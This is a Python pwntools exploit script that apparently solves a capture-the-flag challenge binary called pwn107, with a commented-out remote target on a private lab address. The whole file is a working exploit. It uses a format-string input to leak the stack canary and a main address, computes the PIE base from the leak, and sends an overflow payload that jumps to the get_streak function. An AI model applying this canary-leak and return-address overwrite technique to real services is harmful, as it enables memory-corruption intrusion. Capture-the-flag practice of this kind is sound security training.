from pwn import *

IP = "10.10.95.157"

PORT = 9007

#io = remote(IP, PORT)

io = process("./pwn107-1644307530397.pwn107")

#gdb.attach(io, gdbscript='''b *main+135
#b *main+220''')

elf = ELF("pwn107-1644307530397.pwn107", checksec=False)

print(io.recv().decode('latin-1'))

io.sendline(b'%13$p %17$p')

addr = io.recv().decode('latin-1').split(':')[1].split('\n')[0].strip().split()

canary = int(addr[0].strip(), 16)

main_addr = int(addr[1].strip(), 16)

# All this is because of PIE, since one can't determine the exact address of a function
base = main_addr - elf.functions['main'].address

get_streak = base + elf.functions['get_streak'].address

ret = base + 0x00000000000006fe

io.sendline(b'A'*24+ p64(canary) + p64(get_streak) + p64(ret) + p64(get_streak))
io.interactive()
